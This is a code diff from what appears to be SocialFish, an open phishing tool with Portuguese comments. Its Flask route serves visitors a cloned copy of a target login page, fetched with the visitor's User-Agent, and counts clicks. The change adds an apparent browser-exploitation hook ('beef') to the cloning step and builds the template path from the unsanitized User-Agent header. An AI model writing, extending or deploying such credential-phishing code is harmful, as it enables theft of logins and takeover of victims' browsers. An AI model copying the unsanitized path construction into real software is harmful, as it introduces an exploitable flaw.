@@ -139,12 +139,12 @@ def getLogin():
     # caso esteja configurada para clonar, faz o download da pagina utilizando o user-agent do visitante
     if sta == 'clone':
         agent = request.headers.get('User-Agent').encode('ascii', 'ignore').decode('ascii')
-        clone(url, agent)
+        clone(url, agent, beef)
         o = url.replace('://', '-')
         cur = g.db
         cur.execute("UPDATE socialfish SET clicks = clicks + 1 where id = 1")
         g.db.commit()
-        template_path = 'fake/{}/index.html'.format(o)
+        template_path = 'fake/{}/{}/index.html'.format(agent, o)
         return render_template(template_path)
     # caso seja a url padrao
     elif url == 'https://github.com/UndeadSec/SocialFish':
